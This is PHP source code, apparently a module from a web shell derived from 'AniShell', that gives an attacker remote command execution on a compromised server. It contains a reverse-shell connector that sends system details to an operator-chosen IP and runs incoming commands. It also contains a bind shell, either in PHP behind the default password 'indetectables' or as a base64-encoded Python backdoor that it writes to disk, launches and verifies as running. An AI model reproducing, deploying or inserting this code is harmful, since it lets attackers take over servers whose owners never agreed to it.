<?php
    // based on AniShell
    if (@sValid($p['ip']) && sValid($p['port'])){
        $ip = $p['ip'];
        $port = $p['port'];
        $sBuff .= '<p>The Program is now trying to connect!</p>';
        $sockfd = fsockopen($ip, $port, $errno, $errstr);
        if ($errno != 0){
            $sBuff .= "<font color='red'><b>$errno</b>: $errstr</font>";
        } else if (!$sockfd){
            $result = '<p>Fatal: An unexpected error was occured when trying to connect!</p>';
        } else {
            $len = 1500;
            fputs($sockfd, execute('uname -a') . "\n");
            fputs($sockfd, execute('pwd') . "\n");
            fputs($sockfd, execute('id') . "\n\n");
            fputs($sockfd, execute('time /t & date /T') . "\n\n");

            while (!feof($sockfd)) {
                fputs($sockfd, '(Shell)[$]> ');
                fputs($sockfd, "\n" . execute(fgets($sockfd, $len)) . "\n\n");
            }
            fclose($sockfd);
        }
    } else if (@(sValid($p['port'])) && (sValid($p['passwd'])) && (sValid($p['mode']))){
            $address = '127.0.0.1';
            $port = $p['port'];
            $pass = $p['passwd'];

            if ($p['mode'] === 'Python'){
                $Python_CODE = "IyBTZXJ2ZXIgIA0KIA0KaW1wb3J0IHN5cyAgDQppbXBvcnQgc29ja2V0ICANCmltcG9ydCBvcyAgDQoNCmhvc3QgPSAnJzsgIA0KU0laRSA9IDUxMjsgIA0KDQp0cnkgOiAgDQogICAgIHBvcnQgPSBzeXMuYXJndlsxXTsgIA0KDQpleGNlcHQgOiAgDQogICAgIHBvcnQgPSAzMTMzNzsgIA0KIA0KdHJ5IDogIA0KICAgICBzb2NrZmQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgIA0KDQpleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCg0KICAgICBwcmludCAiRXJyb3IgaW4gY3JlYXRpbmcgc29ja2V0IDogIixlIDsgIA0KICAgICBzeXMuZXhpdCgxKTsgICANCg0Kc29ja2ZkLnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQgLCBzb2NrZXQuU09fUkVVU0VBRERSICwgMSk7ICANCg0KdHJ5IDogIA0KICAgICBzb2NrZmQuYmluZCgoaG9zdCxwb3J0KSk7ICANCg0KZXhjZXB0IHNvY2tldC5lcnJvciAsIGUgOiAgICAgICAgDQogICAgIHByaW50ICJFcnJvciBpbiBCaW5kaW5nIDogIixlOyANCiAgICAgc3lzLmV4aXQoMSk7ICANCiANCnByaW50KCJcblxuPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KcHJpbnQoIi0tLS0tLS0tIFNlcnZlciBMaXN0ZW5pbmcgb24gUG9ydCAlZCAtLS0tLS0tLS0tLS0tLSIgJSBwb3J0KTsgIA0KcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuXG4iKTsgDQogDQp0cnkgOiAgDQogICAgIHdoaWxlIDEgOiAjIGxpc3RlbiBmb3IgY29ubmVjdGlvbnMgIA0KICAgICAgICAgc29ja2ZkLmxpc3RlbigxKTsgIA0KICAgICAgICAgY2xpZW50c29jayAsIGNsaWVudGFkZHIgPSBzb2NrZmQuYWNjZXB0KCk7ICANCiAgICAgICAgIHByaW50KCJcblxuR290IENvbm5lY3Rpb24gZnJvbSAiICsgc3RyKGNsaWVudGFkZHIpKTsgIA0KICAgICAgICAgd2hpbGUgMSA6ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIGNtZCA9IGNsaWVudHNvY2sucmVjdihTSVpFKTsgIA0KICAgICAgICAgICAgIGV4Y2VwdCA6ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICBwaXBlID0gb3MucG9wZW4oY21kKTsgIA0KICAgICAgICAgICAgIHJhd091dHB1dCA9IHBpcGUucmVhZGxpbmVzKCk7ICANCiANCiAgICAgICAgICAgICBwcmludChjbWQpOyAgDQogICAgICAgICAgIA0KICAgICAgICAgICAgIGlmIGNtZCA9PSAnZzJnJzogIyBjbG9zZSB0aGUgY29ubmVjdGlvbiBhbmQgbW92ZSBvbiBmb3Igb3RoZXJzICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tLS0tLS0tLS0iKTsgIA0KICAgICAgICAgICAgICAgICBjbGllbnRzb2NrLnNodXRkb3duKCk7ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIG91dHB1dCA9ICIiOyAgDQogICAgICAgICAgICAgICAgICMgUGFyc2UgdGhlIG91dHB1dCBmcm9tIGxpc3QgdG8gc3RyaW5nICANCiAgICAgICAgICAgICAgICAgZm9yIGRhdGEgaW4gcmF3T3V0cHV0IDogIA0KICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IG91dHB1dCtkYXRhOyAgDQogICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgIGNsaWVudHNvY2suc2VuZCgiQ29tbWFuZCBPdXRwdXQgOi0gXG4iK291dHB1dCsiXHJcbiIpOyAgDQogICAgICAgICAgICAgICANCiAgICAgICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tIik7ICANCiAgICAgICAgICAgICAgICAgY2xpZW50c29jay5jbG9zZSgpOyAgDQogICAgICAgICAgICAgICAgIGJyZWFrOyAgDQpleGNlcHQgIEtleWJvYXJkSW50ZXJydXB0IDogIA0KIA0KDQogICAgIHByaW50KCJcblxuPj4+PiBTZXJ2ZXIgVGVybWluYXRlZCA8PDw8PFxuIik7ICANCiAgICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KICAgICBwcmludCgiXHRUaGFua3MgZm9yIHVzaW5nIEFuaS1zaGVsbCdzIC0tIFNpbXBsZSAtLS0gQ01EIik7ICANCiAgICAgcHJpbnQoIlx0RW1haWwgOiBsaW9uYW5lZXNoQGdtYWlsLmNvbSIpOyAgDQogICAgIHByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKTsNCg==";
                $bindname = 'bind.py';
                $fd = fopen($bindname, 'w');
                if ($fd){
                    fwrite($fd, base64_decode($Python_CODE));
                    if ($isWIN){
                        $sBuff .= '[+] OS Detected = Windows';
                        execute('start bind.py');
                        $pattern = 'python.exe';
                        $list = execute('TASKLIST');
                    } else {
                        $sBuff .= '[+] OS Detected = Linux';
                        execute('chmod +x bind.py ; ./bind.py');
                        $pattern = $bindname;
                        $list = execute('ps -aux');
                    }

                    if (preg_match("/$pattern/", $list))
                        $sBuff .= '<p class="alert_green">Process Found Running! Backdoor Setuped Successfully</p>';
                    else
                        $sBuff .= '<p class="alert_red">Process Not Found Running! Backdoor Setup FAILED</p>';

                    $sBuff .= "<br/><br/>\n<b>Task List :-</b> <pre>\n$list</pre>";
                }
            }
    } else if (@$p['mode'] === 'PHP'){
        if (function_exists("socket_create")){
            $sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);// Create a TCP Stream socket
            if (socket_bind($sockfd, $address, $port) == false)
                $sBuff .= "Cant Bind to the specified port and address!";
            socket_listen($sockfd, 17);// Start listening for connections
            $client = socket_accept($sockfd);//Accept incoming requests and handle them as child processes
            socket_write($client, 'Password: ');                
            $input = socket_read($client, strlen($pass) + 2); // +2 for \r\n // Read the pass from the client
            if (trim($input) == $pass){
                socket_write($client, "\n\n");
                socket_write($client, ($isWIN) ? execute("date /t & time /t") . "\n" . execute("ver") : execute("date") . "\n" . execute("uname -a"));
                socket_write($client, "\n\n");

                while (1){// Print command prompt
                    $maxCmdLen = 31337;
                    socket_write($client, '(Shell)[$]> ');
                    $cmd = socket_read($client, $maxCmdLen);
                    if ($cmd == false){
                        $sBuff .= 'The client Closed the conection!';
                        break;
                    }
                    socket_write($client, execute($cmd));
                }
            } else {
                $sBuff .= tText('Wrong Password');
                socket_write($client, "Wrong Password!\n\n");
            }
            socket_shutdown($client, 2);
            socket_close($socket);  
            //socket_close($client);// Close the client (child) socket
            //socket_close($sock);// Close the master sockets
        } else
            $sBuff .= tText('Socket Conections not Allowed/Supported by the server!');
    } else {
        $sBuff .= '
        <div class="table floatCenter">
            <div class="table-row">
                <div class="table-col floatCenter"><b>' . tText('Back Connect') . '</b></div>
                <div class="table-col floatCenter"><b>' . tText('Bind Shell') . '</b></div>
            </div>
            <div class="table-row" style="text-align:left;">
                <div class="table-col"><form>
                ' . mInput('ip', $_SERVER['REMOTE_ADDR'], tText('IP'), 1) . '
                ' . mInput('port', '31337', tText('Port'), 1) . '
                ' . mSelect('mode', array('PHP'), 1, 0, 0, tText('Mode')) . '
                ' . mSubmit(tText('Listen'), 'uiupdate(0)', 1) . '
                </form></div>
                <div class="table-col"><form>
                ' . mInput('port', '31337', tText('Port'), 1) . '
                ' . mInput('passwd', 'indetectables', tText('Password'), 1) . '
                ' . mSelect('mode', array('PHP', 'Python'), 1, 0, 0, tText('Mode')) . '
                ' . mSubmit(tText('Bind'), 'uiupdate(1)', 1) . '
                </form></div>
        </div>';
    }